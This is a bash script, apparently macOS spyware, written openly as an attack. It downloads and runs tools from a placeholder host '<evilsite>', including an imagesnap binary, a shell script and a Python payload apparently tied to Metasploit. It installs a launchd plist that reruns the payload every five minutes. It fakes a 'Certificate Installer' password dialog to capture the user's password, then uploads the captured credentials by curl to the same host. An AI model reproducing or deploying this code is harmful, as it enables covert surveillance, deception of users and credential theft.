#!/bin/bash

# dig a hole
HOSTNAME=`/bin/hostname`
USERNAME=`/usr/bin/whoami`
PYTHON=`which python`

# put some shit in the hole
mkdir /Users/$USERNAME/.dtc2
curl -s -o /Users/$USERNAME/.dtc2/imagesnap http:///<evilsite>/imagesnap
curl -s -o /Users/$USERNAME/.dtc2/dtc2.sh http://<evilsite>/dtc2.sh
curl -s -o /Users/$USERNAME/.dtc2/msf.py http://<evilsite>/msf.py
chmod +x /Users/$USERNAME/.dtc2/dtc2.sh
chmod +x /Users/$USERNAME/.dtc2/imagesnap
/usr/bin/python /Users/$USERNAME/.dtc2/msf.py
/bin/sh /Users/$USERNAME/.dtc2/dtc2.sh

# create plist

echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http:///www.apple.com/DTDs/PropertyList-1.0.dtd\">" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "<plist version=\"1.0\">" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "<dict>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    <key>Label</key>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    <string>net.dtc2</string>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    <key>ProgramArguments</key>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    <array>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "        <string>/Users/$USERNAME/.dtc2/dtc2.sh</string>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    </array>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    <key>StartInterval</key>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "    <integer>300</integer>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "</dict>" >> /Users/$USERNAME/.dtc2/dtc2.plist
echo "</plist>" >> /Users/$USERNAME/.dtc2/dtc2.plist

# install spy plist plist
launchctl load /Users/$USERNAME/.dtc2/dtc2.plist
launchctl start /Users/$USERNAME/.dtc2/dtc2.plist

# ask the user nicely for creds
echo $USERNAME > /Users/$USERNAME/.dtc2/$HOSTNAME-creds.txt
/usr/bin/osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Installation of IAC Security Certificates requires your password to continue" & return & return  default answer "" with icon 1 with hidden answer with title "Certificate Installer"' >> $HOSTNAME-creds.txt

#push creds up
/usr/bin/curl -s -F "file=@$HOSTNAME-creds.txt" http://<evilsite>/dirtyhax/tinder/upload.php 2>&1 > /dev/null

